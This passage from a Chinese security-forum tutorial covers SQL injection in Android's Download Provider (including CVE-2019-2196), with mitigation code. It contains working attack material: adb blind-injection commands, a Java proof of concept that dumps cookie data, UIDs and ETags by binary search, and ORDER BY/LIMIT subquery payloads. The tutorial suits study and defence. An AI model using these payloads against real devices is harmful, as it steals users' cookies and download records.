这里需要从Google Chrome下载任何文件（即PDF文件）或从Gmail下载任何附件，确保提供程序包含一些数据，然后使用该语句。  
  
   
  
由于底层SQLiteQueryBuilder中强制使用严格模式，无法实现基于UNION语句的直接注入，但可以通过利用盲SQL注入提取所有信息：  
```
adb shell content query --uri content://downloads/public_downloads/0 -- where "1=1) AND (_id=1 AND cookiedata LIKE 'a%') OR (1=1"
```  
  
  
  
也可以从request_headers表转储所有内容：  
```
adb shell content query --uri content://downloads/public_downloads/0 -- where "1=1) AND (SELECT header FROM request_headers WHERE _id=1) LIKE 'a%' OR (1=1"
```  
  
  
还可以使用盲SQL注入（如果启用此选项，则过程将稍微慢一些）来包含受限列，如UID、ETAG或CookieData  
  
#### （2）漏洞复现  
  
首先我们需要从google上下载一些数据：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjk5ITwfmiauGI5pic76qVdYHDwCLkyWHogvVKXrx4JJadaQukgCmsgnog/640?wx_fmt=png "")  
  
这里没有合适的案例，就不进行演示了。  
  
   
  
然后我们编写Poc:  
```
private void dump(boolean dumpProtectedColumns) {
       ContentResolver res = getContentResolver();
       Uri uri = Uri.parse("content://downloads/public_downloads/#");
       Cursor cur = null;
       Log.e("WindXaa","ERROR: The device does not appear to be vulnerable1");
       try {
           //这里可以替换我们的sql注入构造语句
           cur = res.query(uri, null, "1=1) OR (1=1", null, null);
       } catch (IllegalArgumentException e) {
           Log.e("WindXaa", "Error", e);
           Log.e("WindXaa","ERROR: The device does not appear to be vulnerable");
           //return;
       }
 
       try {
           if (cur != null || cur.getCount() > 0) {
               // Iterate all results and display some fields for each row from the downloads database
               while (cur.moveToNext()) {
                   int rowId = cur.getInt(cur.getColumnIndex("_id"));
                   String rowData = cur.getString(cur.getColumnIndex("_data"));
                   String rowUri = cur.getString(cur.getColumnIndex("uri"));
                   String rowTitle = cur.getString(cur.getColumnIndex("title"));
                   String rowDescription = cur.getString(cur.getColumnIndex("description"));
                   String string = null;
                   StringBuilder sb = new StringBuilder(string);
                   sb.append("DOWNLOAD ID ").append(rowId);
                   sb.append("\nData: ").append(rowData);
                   sb.append("\nUri: ").append(rowUri);
                   sb.append("\nTitle: ").append(rowTitle);
                   sb.append("\nDescription: ").append(rowDescription);
 
                   if (dumpProtectedColumns) {
                       int uid = binarySearch(rowId, "uid");
                       sb.append("\nUID: ").append(uid);
 
                       dumpColumn(rowId, "CookieData", sb);
                       dumpColumn(rowId, "ETag", sb);
                   }
 
                   Log.w("WindXaa",sb.toString());
               }
               Log.e("WindXaa","\n\nDUMP FINISHED");
           }
       } finally {
           if (cur != null)
               cur.close();
       }
   }
 
   private void dumpColumn(int rowId, String columnName, StringBuilder sb) {
       if (isTrueCondition(rowId, "length(" + columnName + ") > 0")) {
           int len = binarySearch(rowId, "length(" + columnName + ")");
 
           sb.append("\n" + columnName + ": ");
           for (int i = 1; i <= len; i++) {
               int c = binarySearch(rowId, "unicode(substr(" + columnName + "," + i + ",1))");
               String newChar = Character.toString((char) c);
               sb.append(newChar);
           }
       }
   }
 
   private int binarySearch(int id, String sqlExpression) {
       int min = 0;
       int max = 20000;
       int mid = 0;
 
       while (min + 1 < max) {
           mid = (int) Math.floor((double) (max + min) / 2);
 
           if (isTrueCondition(id, sqlExpression + ">" + mid))
               min = mid;
           else
               max = mid;
       }
 
       if ((mid == max) && isTrueCondition(id, sqlExpression + "=" + mid))
           return mid;
       else if (isTrueCondition(id, sqlExpression + "=" + (mid + 1))) // Extra check
           return mid + 1;
 
       return -1;
   }
 
   private boolean isTrueCondition(int rowId, String sqlCondition) {
       ContentResolver res = getContentResolver();
       Uri uri = Uri.parse("content://downloads/public_downloads/0");
 
       Cursor cur = res.query(uri, new String[]{"_id"}, "_id=" + rowId + ") and (" +
               sqlCondition + ") or (1=1", null, null);
 
       try {
           return (cur != null && cur.getCount() > 0);
       } finally {
           if (cur != null)
               cur.close();
       }
   }
```  
  
  
  
预期效果显示（这里由于没找到合适案例，使用官方图片展示效果）：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GHY6YqkqNrVDDwnUD84eyjOgfHiaZ4YB1zrTgRUXI60TNiaNX0aju7X5eL3zlI02ulXVG4Aldnxgcg/640?wx_fmt=png "")  
####   
#### （3）安全防护  
```
如果它没有破坏任何功能，请考虑添加被删除的行：
@Override
public query(final Uri uri, String[] projection,
    final String selection, final String[] selectionArgs,
    final String sort) {
    Helpers.validateSelection(selection, sAppReadableColumnsSet);
```  
  
###   
### 2.Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）  
#### （1）漏洞原理  
  
同样是针对Download Provider，因为被授予android.permission.INTERNET权限的恶意应用可以在query()方法的sort参数（ORDER BY子句）中附加一个包含子查询语句的LIMIT子句，实施SQL注入攻击，从而检索Download Provider内部数据库的所有条目。  
####   
#### （2）漏洞复现  
  
可以构造sql注入语句  
  
  
sort参数传入的值是ORDER BY子句后拼接的内容，为了利用此漏洞，可以在sort参数处构造：  
```
columnName
limit
case when (condition) then 1 else 0 end
例如：
_id limit case when(
    (select count(*) from downloads)>0
)
then 1 else 0 end
```  
  
  
这里详细的复现过程可以参考文章：Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）（https://zhuanlan.zhihu.com/p/367365614）  
####   
#### （3）安全防护  
  
确保执行数据库操作前合理校验query()方法的sort参数。例如，确保sort参数不包含注入了LIMIT子句和潜在的恶意子查询语句的恶意payload，或者执行更严格的校验，比如要求参数仅包含以逗号分隔的现有数据列列表和字符串“asc”或“desc”。  
  
   
  
DownloadProvider.java文件添加代码：  
```
@Override
public Cursor query(final Uri uri, String[] projection,
         final String selection, final String[] selectionArgs,
         final String sort) {
 
    ...
    if (shouldRestrictVisibility()) {
        if (sort != null && sort.toLowerCase(Locale.ENGLISH).contains("limit"))
            throw new IllegalArgumentException("invalid sort");
        ...
    }
    ...
}
```  
  
##   
##   
##   
```
```  
  
  
本文通过总结和学习，初步的将讲解了Android平台APP上的常见的Sql注入的方式，并使用一些案例进行了一一的列举，文中一部分漏洞没有找到合适的案例，大家可以参考对应作者的博客，后续相关的实验材料上传github和知识星球。  
  
   
  
github网址：WindXaa（https://github.com/WindXaa/Android-Vulnerability-Mining）  
##   
##   
```
```  
##   
##   
  
sql注入漏洞：  
```
https://github.com/li-xin-yi/SQL-inject-demo
https://security-summer-labs.readthedocs.io/en/latest/lab8/readme.html#task-1-sql-injection-attack-on-select-statement
https://chowdera.com/2022/02/202202060538187242.html
https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/
https://cloud.tencent.com/developer/article/1580824
```  
  
  
DownLoad Provider漏洞：  
```
https://zhuanlan.zhihu.com/p/367365614
https://mabin004.github.io/2019/04/15/Android-Download-Provider%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
https://ioactive.com/multiple-vulnerabilities-in-androids-download-provider-cve-2018-9468-cve-2018-9493-cve-2018-9546/
```  
  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FAAUEk4E2BCtHuj2rYPKvdia9uic7q0whFS5eoWsJCLXBnUOaUtNbrX04sUnlMx1a7KTOU1WWYib10g/640?wx_fmt=png "")  
  
  
**看雪ID：随风而行aa**  
  
https://bbs.pediy.com/user-home-905443.htm  
  
*本文由看雪论坛 随风而行aa 原创，转载请注明来自看雪社区  
  
  
[](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458458369&idx=3&sn=b728d350f58376065641a3811009fa49&chksm=b18e298b86f9a09dac08d8402f57da1fd6aa7911f8b37b0c21eaad3fcad598bd7031d884ce91&scene=21#wechat_redirect)  
  
  
  
**#****往期推荐**  
  
1.[House of apple 一种新的glibc中IO攻击方法](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458459847&idx=1&sn=f4afaf30634e626ce539023d1de675fe&chksm=b18e2e4d86f9a75bf414e6332f9cfb5601fffe6f3388d5810971b0e92738fe640552ea889841&scene=21#wechat_redirect)  
  
  
2.[so文件分析的一些心得](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458459775&idx=1&sn=6c0c9339f1ffc06d3eba9a4e595e75ff&chksm=b18e2ef586f9a7e384e18d417ac75f9c2d12d1364b5c5f14dc1b42a7fc94b0f4d5e75c0e4d4e&scene=21#wechat_redirect)  
  
  
3.[bang加固简单分析](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458459526&idx=1&sn=11ff8eeb0e81acb9f1c3f6c0b62027e7&chksm=b18e2d0c86f9a41a84ebd66daa909439b63ffbae824b6d105ae7be166d037f72ea1dde0baf6e&scene=21#wechat_redirect)  
  
  
4.[指令级工具Dobby源码阅读](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458459349&idx=1&sn=c7befdac063330a9ada2e3d1b0e396ef&chksm=b18e2c5f86f9a5492113d4584d85a484eedb3384f8e4ad14235273dd830e4cd57615f08ec926&scene=21#wechat_redirect)  
  
  
5.[AFL速通——流程及afl-fuzz.c源码简析](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458459331&idx=2&sn=ee8a8e78bdbe9c4471641ba038e9ef5b&chksm=b18e2c4986f9a55fe86eb2422a2d8a49a57a2f26323993f33a56a581a3c1224f3eaa6ee9aad3&scene=21#wechat_redirect)  
  
  
6.[sql注入学习笔记](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458459247&idx=1&sn=710f3ce985fc785c615dc4b095f32ac5&chksm=b18e2ce586f9a5f34509df575e11f51b391ce54fabc7dd93c2eabef9dfb260ad25813e5da95b&scene=21#wechat_redirect)  
****  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球在看**  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicd7icG69uHMQX9DaOnSPpTgamYf9cLw1XbJLEGr5Eic62BdV6TRKCjWVSQ/640?wx_fmt=gif "")  
  
点击“阅读原文”，了解更多！  
